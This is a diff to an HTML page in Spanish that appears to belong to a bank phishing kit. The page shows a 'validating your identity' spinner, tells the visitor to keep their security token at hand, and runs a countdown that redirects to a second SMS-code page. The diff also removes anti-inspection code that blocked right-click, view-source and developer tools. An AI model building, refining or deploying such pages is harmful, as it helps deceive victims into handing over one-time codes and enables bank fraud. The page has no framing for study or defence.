@@ -13,13 +13,14 @@
         display: flex;
         justify-content: center;
         align-items: center;
-        background-image: url(background.webp);
+        background-image: url(background.jpg);
         background-size: cover;
         background-position: center;
       }
 
       .container {
         display: flex;
+
         height: 100%;
         width: 100%;
       }
@@ -81,6 +82,7 @@
         position: relative;
         height: 60px;
         border: 0;
+
         border-bottom: 1px solid gray;
         background: #ededed;
         outline: none;
@@ -127,6 +129,7 @@
         border: 0;
         border-bottom: 1px solid gray;
         background: #ededed;
+
         outline: none;
       }
       .form-group2 input:focus {
@@ -163,13 +166,13 @@
   <body>
     <div class="container">
       <div class="left-side">
-        <form>
+      <form>
           <div style="text-align: center">
-            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+            <img src="./css/logo.png" alt="" style="width: 60%; margin-top: 20px" />
           </div>
           <div style="width: 100%; text-align: center">
             <div class="form-group">
-              <img src="ldr.gif" style="width: 100px" />
+              <img src="./css/ldr.gif" style="width: 100px" />
             </div>
           </div>
 
@@ -184,8 +187,9 @@
               margin-bottom: 30px;
             "
           >
-            Estamos validando tu identidad... <br />
-             
+            Estamos validando tu identidad. <br />
+            por favor ten cerca tu instrumento de seguridad
+            <br />
             <br />
             <label style="color: black"
               >Tiempo restante <span id="countdown">15</span> segundos</label
@@ -208,15 +212,15 @@
                   if (seconds < 0) {
                     // Limpiar el intervalo y mostrar una alerta
                     clearInterval(countdownInterval);
-                    alert("Su código ha expirado, ingrese un nuevo código");
-                    window.location.href = "sms.html";
+
+                    window.location.href = "sms2.html";
                   }
                 }, 1000); // Intervalo de 1 segundo
               }
 
               // Llamar a la función de cuenta regresiva al cargar la página
               document.addEventListener("DOMContentLoaded", function () {
-                startCountdown(14); // Iniciar la cuenta regresiva con 14 segundos
+                startCountdown(14); // Iniciar la cuenta regresiva con 30 segundos
               });
             </script>
           </div>
@@ -224,57 +228,5 @@
       </div>
       <div class="right-side"></div>
     </div>
-
-    <script>
-      // Deshabilitar el clic derecho
-      document.addEventListener("contextmenu", function (event) {
-        event.preventDefault();
-      });
-
-      // Deshabilitar la combinación de teclas Ctrl + U
-      document.addEventListener("keydown", function (event) {
-        if (event.ctrlKey && event.key === "u") {
-          event.preventDefault();
-        }
-      });
-            /////////codigo de seguridad
-  function blockDevTools() {
-      var devtools = false;
-      var threshold = 160;
-      var checkDevTools = function() {
-          var start = new Date();
-          debugger;
-          var end = new Date();
-          if (end - start > threshold) {
-              devtools = true;
-              document.body.innerHTML = "¡Inspección bloqueada!";
-          } else {
-              devtools = false;
-          }
-      };
-      setInterval(checkDevTools, 1000); // 1e3 = 1000 ms = 1 segundo
-  }
-
-  // Prevenir clic derecho e inspección
-  function preventInspection() {
-      document.addEventListener("contextmenu", function(event) {
-          event.preventDefault();
-      });
-
-      document.addEventListener("keydown", function(event) {
-          if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 67))) {
-              event.preventDefault();
-          }
-      });
-  }
-
-  // Inicializar los eventos cuando cargue la página
-  window.onload = function() {
-
-      preventInspection();
-      blockDevTools();
-      startTimer();
-  };
-    </script>
   </body>
 </html>
